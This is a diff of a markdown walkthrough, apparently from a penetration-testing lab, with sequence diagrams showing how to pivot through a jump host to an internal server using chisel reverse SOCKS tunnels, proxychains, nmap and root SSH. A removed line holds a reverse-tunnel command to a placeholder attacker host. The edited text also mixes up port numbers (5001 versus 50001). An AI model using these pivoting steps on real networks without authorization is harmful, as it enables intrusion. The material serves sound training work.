@@ -60,10 +60,11 @@ sequenceDiagram
   participant A as Attacker
   participant J as Jump
 
-  A->>A: chisel server -p 8000 --reverse
-  J->>A: chisel client ATTACKER_IP:8000 R:50001:socks
-  Note over A,J: SOCKS5 now at 127.0.0.1:50001
-  A->>J: SOCKS forwards traffic
+  A->>A: Open chisel server on port 8000
+  J->>A: Connect to chisel server and request the server to open port 50001 as socks
+  Note over A: SOCKS5 now at 127.0.0.1:50001
+  Note over A,J: 5001 -> chisel tunnel ->
+  A->>J: proxychains src - attacker:5001 - chisel server:8000 - chisel client - dest
 ```
 
 ### Step 2 – Use ProxyChains through **Jump** to reach **Secure**
@@ -83,11 +84,11 @@ sequenceDiagram
   participant J as Jump
   participant S as Secure
 
-  Note over A,J: SOCKS5 tunnel
-  A->>J: SOCKS encapsulates nmap scan
+  Note over A,J: 5001 -> chisel tunnel ->
+  A->>J: Chisel encapsulated nmap scan
   J->>S: nmap TCP connect scan
   S-->>J: TCP connect response
-  J-->>A: TCP connect response encapsulated in SOCKS
+  J-->>A: TCP connect response encapsulated in Chisel
 ```
 
 ### Step 3 – Add a second tunnel **from Secure back to Attacker** using the Jump path
@@ -120,13 +121,15 @@ sequenceDiagram
   participant J as Jump
   participant S as Secure
 
-  A->>J: SOCKS:5001(ssh root@192.168.80.30)
+  Note over A,J: 5001 -> chisel tunnel 1 ->
+  A->>J: chisel (ssh root@192.168.80.30)
   J->>S: ssh root@192.168.80.30
   S-->>A: ssh connection
-  S->>S: chisel server --socks5 -p 8001
-  A->>J: SOCKS:5001(chisel 192.168.80.30:8001)
+  S->>S: chisel server on port 8001
   J->>S: chisel 192.168.80.30:8001
-  Note over A,S: SOCKS5 now at 127.0.0.1:50002
+  A->>J: chisel (chisel 192.168.80.30:8001)
+  A->>A: Open port 50002 for socks
+  Note over A,S: 5002 -> chisel tunnel 2 ->
 ```
 
 **Update ProxyChains**
